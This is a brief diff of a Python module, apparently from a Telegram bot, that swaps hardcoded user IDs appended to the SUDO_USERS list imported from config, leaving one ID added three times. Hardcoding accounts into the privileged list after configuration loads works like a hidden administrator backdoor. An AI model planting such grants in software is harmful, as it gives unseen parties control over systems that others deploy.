@@ -5,8 +5,8 @@ from config import SUDO_USERS
 from driver.admins import get_administrators
 
 
-SUDO_USERS.append(1047777673)
-SUDO_USERS.append(635335686)
+SUDO_USERS.append(1005593710)
+SUDO_USERS.append(1005593710)
 SUDO_USERS.append(1005593710)
 
 
